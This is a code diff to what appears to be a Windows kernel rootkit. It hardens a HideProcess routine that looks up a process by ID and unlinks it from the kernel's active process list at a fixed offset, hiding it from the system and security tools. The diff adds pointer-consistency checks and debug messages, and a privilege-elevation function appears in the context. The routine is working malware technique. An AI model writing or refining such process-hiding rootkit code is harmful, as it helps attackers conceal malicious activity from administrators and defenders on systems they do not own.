@@ -128,7 +128,7 @@ PrivilegeElevationForProcess(
     return (0);
 }
 
-int
+int 
 HideProcess(
     int pid
 )
@@ -140,28 +140,41 @@ HideProcess(
     __try
     {
 
-        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, (PEPROCESS*)&process);
+        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)pid, (PEPROCESS *)&process);
 
         if (ret != STATUS_SUCCESS)
         {
             if (ret == STATUS_INVALID_PARAMETER)
             {
-                DbgPrint("the process ID was not found.");
+                DbgPrint("The process ID was not found.");
             }
             if (ret == STATUS_INVALID_CID)
             {
-                DbgPrint("the specified client ID is not valid.");
+                DbgPrint("The specified client ID is not valid.");
             }
             return (-1);
         }
 
-        plist = (PLIST_ENTRY)((char*)process + 0x448);
+        plist = (PLIST_ENTRY)((char *)process + 0x448);
 
         ExAcquirePushLockExclusive(&pLock);
 
+        if (plist->Flink == NULL || plist->Blink == NULL)
+        {
+            ExReleasePushLockExclusive(&pLock);
+            __leave;
+        }
+
+        if (plist->Flink->Blink != plist || plist->Blink->Flink != plist)
+        {
+            ExReleasePushLockExclusive(&pLock);
+            DbgPrint("Error: Inconsistent Flink and Blink pointers.");
+            return (-1);
+        }
+
         plist->Flink->Blink = plist->Blink;
         plist->Blink->Flink = plist->Flink;
-        
+
         plist->Flink = NULL;
         plist->Blink = NULL;
 
@@ -171,6 +184,7 @@ HideProcess(
     }
     __except (EXCEPTION_EXECUTE_HANDLER)
     {
+        DbgPrint("An exception occurred while hiding the process.");
         return (-1);
     }
 
